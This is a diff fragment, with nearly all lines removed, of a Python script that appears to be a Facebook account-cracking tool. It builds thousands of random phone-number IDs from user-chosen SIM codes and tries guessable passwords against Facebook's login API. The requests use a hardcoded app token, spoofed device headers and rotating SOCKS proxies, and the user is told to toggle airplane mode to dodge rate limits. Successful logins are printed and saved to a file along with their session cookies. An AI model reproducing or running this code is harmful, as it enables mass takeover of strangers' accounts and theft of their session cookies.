-            plist.append(input(f'{red}[{white}➤{red}] {green}PASSWORD NO-{i+1} {white}▶︎ \x1b[38;5;208m'));linex()
-    for x in range(limit):
-        nmp = "". join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    clear()
-    with ThreadPoolExecutor(max_workers=30) as error:
-        clear()
-        print(f'{red}[{white}➤{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
-        print(f'{red}[{white}➤{red}]{green} NETWORK {white}  :{green} {sim} ') 
-        print(f'{red}[{white}➤{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
-        print(f'{red}[{white}➤{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');linex()
-        for love in user:
-            ids = code + love
-            ax = ids[:8]
-            bx = ids[:7]
-            cx = ids[:6]
-            xa = love[1:]
-            tl = len(user)
-            xb = love[2:]
-            psd = plist
-            if mtd in ['A','a','01','1']:crack_submit.submit(randm,ids,psd)
-            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
-            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
-            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
-    print(f'\r{white}================================================')
-    print(f'{red}[{white}➤{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
-    print(f'{red}[{white}➤{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
-    print(f'{red}[{white}➤{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
-    print(f'\r{white}================================================')
-    input(f"{red}[{white}➤{red}]{green} PRESS ENTER TO BACK MENU ")
-    menu()
-                   
-def _bd_():
-    clear()
-    print(f'{A}[{R}●{A}] {G}EXAMPLE {A}:{G1} 017{A}/{G1}019{A}/{G1}018{A}/{G1}016');linex()
-    code = input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A}  ');linex()
-    name = ''.join(random.choice(string.digits) for _ in range(2))
-    cod = ''.join(random.choice(string.digits) for _ in range(2))
-    print(f'{A}[{R}●{A}] {G}EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
-    limit = int(input(f'{A}[{R}●{A}] {G}INPUT {R}>>{A}  '))
-    for x in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    clear()
-    with tred(max_workers=30) as crack_submit:
-        clear()
-        print(f"{A}[{R}●{A}] {G}USERNAME{R} : {A}MR CHUTTA");print(f"{A}[{R}●{A}] {G}KEY {R}:{A} {MY_KEY} ");linex();print(f'{A}[{R}●{A}]{G} SIM NAME  {R}>> {A}{sim}')
-        print(f'{A}[{R}●{A}] {G}TOTAL ID {R} >>{A} {limit} {R} >> {G}SIM CODE {R} >>{A} {code}')                                   
-        print(f'{A}[{R}●{A}] {G}TURN ON/OF AIRPLAN MODE EVERY 5 MIN');linex()
-        for love in user:
-            ids = code+name+cod+love
-            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
-            crack_submit.submit(randm,ids,psd)
-    print('')
-    linex()
-    print(f'{A}[{R}●{A}] {G}THE PROCESS HAS BEEN COMPLETED')
-    print(f'{A}[{R}●{A}] {G}TOTAL OK ID {A}:{G2} {str(len(ok))}')
-    print(f'{A}[{R}●{A}] {G}TOTAL CP ID :{A} {str(len(cp))}')
-    linex()
-    input(f'{A}[{R}●{A}] {G}PRESS ENTER TO BACK ')
-    menu()
-#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ RNMETHOD ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#                        
-def randm(ids,psd):
-    global loop,ok,cp,sim_id,xvx
-    prox=random.choice(xvx)
-    bro={"http":"socks4://"+prox}
-    ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX2111;FBSV/12;nullFBCA/armeabi-v7a:armeabi;]"
-    sys.stdout.write(f"\r\r{A}[{G}CHUTTA-RN{A}] >> {A}[{R}{loop}{A}]{R} >> {A}[{G}OK{A}•{G}{len(oks)}{A}]");sys.stdout.flush()
-    sys.stdout.flush()
-    try:
-        for pas in psd:
-            data={'adid':str(uuid.uuid4()),
-            'format':'json',
-            'device_id':str(uuid.uuid4()),
-            'email':ids,
-            'password':pas,
-            'generate_analytics_claims':'1',
-            'community_id':'',
-            'cpl':'true','try_num':'1',
-            'family_device_id':str(uuid.uuid4()),
-            'credentials_type':'password',
-            'source':'login',
-            'error_detail_type':'button_with_disabled',
-            'enroll_misauth':'false',
-            'generate_session_cookies':'1',
-            'generate_machine_id':'1',
-            'currently_logged_in_userid':'0',
-            'locale':'en_US',
-            'client_country_code':'US',
-            'fb_api_req_friendly_name':'authenticate',
-            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
-            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            head={'User-Agent': yek(),
-            'Accept-Encoding':'gzip, deflate',
-            'Connection':'close',
-            'Content-Type':'application/x-www-form-urlencoded',
-            'Host':'graph.facebook.com',
-            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
-            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
-            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-FB-Connection-Type':'MOBILE.LTE',
-            'X-Tigon-Is-Retry':'False',
-            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-            'x-fb-device-group':'5120',
-            'X-FB-Friendly-Name':'ViewerReactionsMutation',
-            'X-FB-Request-Analytics-Tags':'graphservice',
-            'X-FB-HTTP-Engine':'Liger',
-            'X-FB-Client-IP':'True',
-            'X-FB-Server-Cluster':'True',
-            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-            url = 'https://api.facebook.com/auth/login'
-            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-            q = json.loads(po)
-            if 'access_token' in q:
-                uid = str(q['uid'])
-                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                print(f'\r\r\x1b[38;5;46m{A}[{G}CHUTTA-OK💉{A}]{G} {uid} | {pas}')
-                CHUTTA = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-                print(f"\r{R}[{G}COOKIE{R}]{G}━{R}>{CHUTTA} {coki}")
-                open('/sdcard/CHUTTA-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
-                ok.append(uid)
-                break
-            else:continue
-        loop+=1
-    except Exception as e:
-        pass
 
 menu()
